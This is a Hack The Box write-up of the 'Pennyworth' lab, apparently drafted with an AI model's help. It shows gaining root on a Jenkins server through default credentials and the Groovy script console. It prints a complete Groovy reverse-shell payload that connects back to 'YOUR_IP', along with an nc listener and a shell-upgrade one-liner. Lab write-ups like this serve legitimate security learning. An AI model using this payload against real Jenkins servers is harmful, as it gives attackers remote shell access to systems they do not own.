````markdown
# HTB Writeup – Pennyworth 🕵️‍♂️

**Difficulty:** Easy  
**Category:** Jenkins, Java, Reconnaissance, RCE, Default Credentials  
**Date Started:** 2025-06-09  
**Status:** In Progress

---

## 🧪 Initial Enumeration

**Tools Used:**  
- `nmap`

**Command Used:**
```bash
nmap -Pn -sV -T4 <target-ip>
````

**Findings:**

* Port `8080` open – Jenkins interface detected.
* Confirmed version and headers using:

```bash
curl -I http://<target-ip>:8080
```

---

## 🌐 Web Enumeration

* Navigated to `/login` – found default Jenkins login.
* Tried common credentials:

  * ✅ `root:password` – worked.

Checked for exposed endpoints:

* `/script`
* `/manage`
* `/view/all/builds`

---

## 🔍 Vulnerability Discovery

* Discovered Jenkins script console available (`/script`).
* Able to execute **Groovy scripts**.
* Verified RCE capability with:

```groovy
println "test".execute().text
```

---

## 💥 Exploitation (Reverse Shell via Groovy)

### Payload Used:

```groovy
String host = "YOUR_IP"
int port = 8000
String cmd = "/bin/bash"
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start()
Socket s = new Socket(host, port)
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream()
OutputStream po = p.getOutputStream(), so = s.getOutputStream()

while (!s.isClosed()) {
    while (pi.available() > 0)
        so.write(pi.read())
    while (pe.available() > 0)
        so.write(pe.read())
    while (si.available() > 0)
        po.write(si.read())
    so.flush()
    po.flush()
    Thread.sleep(50)
    try {
        p.exitValue()
        break
    } catch (Exception e) {}
}
p.destroy()
s.close()
```

* Set up listener with:

```bash
nc -lvnp 8000
```

* Reverse shell successful, confirmed with:

```bash
whoami
```

---

## 🔄 Privilege Escalation

* Access level: `root`
* No escalation needed post shell.

---

## 🏁 Flags

* ✅ **User Flag:** Captured
* ✅ **Root Flag:** Captured

---

## 📚 Lessons Learned

* Jenkins often exposes powerful endpoints if misconfigured.
* Groovy script console can lead to RCE if accessible.
* Always test common/default credentials on exposed admin portals.
* Reverse shells require listener to be ready *before* execution.
* Stable shells can be upgraded with:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 📎 References

* [HackTricks – Jenkins Security](https://book.hacktricks.xyz/pentesting-web/jenkins)
* [PayloadAllTheThings – Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

```

---

Let me know if you’d like me to turn this into a PDF version, or help you write an index/homepage for your portfolio too!
```
